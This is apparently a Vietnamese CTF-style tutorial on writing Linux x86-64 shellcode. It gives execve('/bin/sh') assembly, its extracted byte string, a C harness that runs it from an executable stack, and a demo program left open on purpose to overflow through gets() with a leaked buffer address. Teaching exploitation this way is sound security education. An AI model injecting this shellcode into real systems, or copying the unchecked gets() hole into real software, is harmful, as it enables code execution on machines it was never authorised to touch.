# Shellcoding (Linux)
Khái niệm về shellcode có rất nhiều bài viết định nghĩa về nó, nên mình sẽ đề cập lại ở đây .Các bạn có thẻ tham khảo 1 số bài viết:
- https://vnhacker.blogspot.com/2006/12/shellcode-thn-chng-nhp-mn.html
- https://en.wikipedia.org/wiki/Shellcode

Tiếp theo mình sẽ nói về cách viết 1 shellcode cơ bản, cụ thể ở đây là 1 shellcode thực thi việc lên shell. Việc lên shell ở đây bản chất là ta sử dụng syscall execve("/bin/sh", NULL, NULL). Syscall là gì thì mình có giải thích qua ở bài viết về ROP bạn có thể tham khảo ở đây:
- https://github.com/shawking2/Writeup/tree/main/ROP

Để Shellcode có thể thực thi trong chương trình thì ta cần 1 số điều kiện cơ bản:

\+ Vùng nhớ ta đặt shellcode phải có quyền execute 
\+ Instruction call địa chỉ mà ta trữ shellcode đó. Khi đó shellcode sẽ được thực thi.
\+ Instruction ret về địa chỉ chú shellcode
\+ Lệnh nhảy về địa chỉ chứ shellcode của ta
\+ Mình chỉ liệt kê cách cách thực thi shellcode thường gặp mà mình thấy (vẫn còn nhiều trường hợp khác)

Để viết một shellcode sử dụng syscall execve("/bin/sh", NULL, NULL). Đầu tiên ta phải viết 1 chương trình assembly call syscall exceve("/bin/sh", NULL, NULL):
```
section .text
  global _start
    _start:
      push rax                    
      mov rbx,'/bin//sh'            # cho rbx chứa chuỗi "/bin/sh"
      xor rsi, rsi                  # rsi = NULL tham số thứ thứ 3 của exceve
      xor rdx, rdx                  # rdx = NULL tham số thứ thứ 3 của exceve
      push rbx                      # push chuỗi '/bin/sh' vào stack. Điều ngày có nghĩa rsp đang mang giá trị là địa chỉ của chuỗi '/bin/sh' 
      push rsp                      # push giá trị của rsp -> địa chỉ của '/bin/sh'
      pop rdi                       # rbx sẽ chứa đối số đầu tiên của excecve  -> "/bin/sh"
      mov al, 0x3b                  # syscall number của exceve
      syscall
```
Để biên dịch nó ta sẽ đưa đoạn code này lưu vào 1 file .asm .Sau dó dùng các lệnh sau để biên dịch:

> nasm -f elf64 shellcode.asm -o shellcode.o

> ld shellcode.o -o shellcode

Thao tác vừa rồi, ta vừa biên dịch đoạn code asm thành file binary:
```
higgs@DESKTOP-PMDB9KR:~$ ./shellcode
$ whoami
shawking
$
```
Run file này ta có thể thấy t đã hoàn thành việc lên shell nhờ gọi syscall exceve("/bin/sh", NULL, NULL).

Vậy thì tiếp theo làm sao ta tạo ra 1 shellcode .Nếu các bạn đã đọc qua cái bài viết ở trên thì bạn sẽ biết rằng shellcode chính là các byte code. Byte code ở đây thức chất chính là các opcode của các instruction trong chương trình ta vừa viết. Vậy để có được shellcode ta chỉ cần xem opcode của nó.

Công cụ objdump sẽ giúp ta điều này:
```
higgs@DESKTOP-PMDB9KR:~$ objdump --disassemble test

test:     file format elf64-x86-64


Disassembly of section .text:

0000000000401000 <_start>:
  401000:       50                      push   %rax
  401001:       48 31 d2                xor    %rdx,%rdx
  401004:       48 31 f6                xor    %rsi,%rsi
  401007:       48 bb 2f 62 69 6e 2f    movabs $0x68732f2f6e69622f,%rbx
  40100e:       2f 73 68
  401011:       53                      push   %rbx
  401012:       54                      push   %rsp
  401013:       5f                      pop    %rdi
  401014:       b0 3b                   mov    $0x3b,%al
  401016:       0f 05                   syscall
```
Các bạn quan sát sẽ thấy có 1 cột hiện thị mã hex:

![screenshot](https://github.com/shawking2/Writeup/blob/main/ShellCode/img/opcode.PNG)
Xâu chuỗi các mã hex lại theo thú tự như trên ta có 1 chuỗi shellcode thực thi exceve("/bin/sh",NULL, NULL)
> SHELLCODE: 
```
\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05
```
Ta có thể viết 1 đoạn code c đẻ kiểm tra shellcode của chúng ta (lưu ý ta phải thêm tham số -z execstack để có quyền execute trên stack)
```
#include <stdio.h>


main()
{
    unsigned char shellcode[] = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05";
    int (*ret)() = (int(*)())shellcode;
    ret();
}
```
Biên dịch :  gcc -z execstack -o shell shell.c
Kết quả thực thi:
```
higgs@DESKTOP-PMDB9KR:~$ gcc -z execstack -o test test.c
test.c:4:1: warning: return type defaults to ‘int’ [-Wimplicit-int]
    4 | main()
      | ^~~~
higgs@DESKTOP-PMDB9KR:~$ ./test
$ whoami
shawking
$
```
Phân tích assembly của chương trình trên sẽ hiệu tại sao shellcode được thực thi:
```
   0x555555555129 <main+4>             sub    rsp, 0x10
   0x55555555512d <main+8>             lea    rax, qword ptr [rip + 0x2efc] <0x555555558030>
   0x555555555134 <main+15>            mov    qword ptr [rbp - 8], rax
   0x555555555138 <main+19>            mov    rdx, qword ptr [rbp - 8]
   0x55555555513c <main+23>            mov    eax, 0
 ► 0x555555555141 <main+28>            call   rdx <shellcode>
        rdi: 0x1
        rsi: 0x7fffffffdff8 —▸ 0x7fffffffe207 ◂— '/home/higgs/test'
        rdx: 0x555555558030 (shellcode) ◂— push   rax /* 0x48f63148d2314850 */
        rcx: 0x7ffff7fac718 (__exit_funcs) —▸ 0x7ffff7faeb00 (initial) ◂— 0

   0x555555555143 <main+30>            mov    eax, 0
   0x555555555148 <main+35>            leave
   0x555555555149 <main+36>            ret
```
Tại đây instruction call sẽ call địa chỉ chứa shellcode của chúng ta. Khi đó shellcode sẽ được thi.
> Challenge demo:
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

// gcc -z execstack -o demo demo.c -no-pie
int main(void)
{
  char buffer[32];
  printf("DEBUG: %p\n", buffer);
  gets(buffer);
}
```
### File binary: [demo](https://github.com/shawking2/Writeup/blob/main/ShellCode/src/demo?raw=true)







